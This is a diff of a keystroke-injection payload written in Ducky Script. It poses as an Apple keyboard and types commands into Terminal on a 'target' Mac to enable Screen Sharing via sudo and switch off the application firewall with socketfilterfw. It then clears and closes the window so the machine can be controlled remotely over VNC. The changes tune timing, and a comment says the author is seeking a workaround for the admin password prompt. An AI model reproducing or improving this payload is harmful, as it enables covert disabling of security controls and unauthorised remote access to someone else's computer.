@@ -6,7 +6,7 @@ REM and control that Mac from another computer using a VNC viewer application.
 
 REM This script disables the firewall
 REM disable the local address check for Screen Sharing
-REM and enables screen sharing via sudo command (must know password)
+REM and enables screen sharing via sudo command (must know password Trying to find a workaround)
 
 
 REM Now you can use your local computer to tap into the target
@@ -27,18 +27,17 @@ REM Version: 1.0
 REM Category: Execution
 
 ID 05ac:021e Apple:Keyboard
-DELAY 1000
+DELAY 500
 GUI SPACE
 DELAY 500
 STRING terminal
-DELAY 500
+DELAY 1000
 ENTER
 DELAY 500
 STRING sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist
-REM must enter admin password. Trying to find a workout 
-DELAY 7000
+DELAY 2000
 ENTER
-DELAY 1000
+DELAY 8000
 STRING /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
 DELAY 3000
 ENTER
@@ -48,6 +47,6 @@ DELAY 3000
 ENTER 
 DELAY 500
 STRING clear
-ENTER
+DELAY 500
 GUI w
 
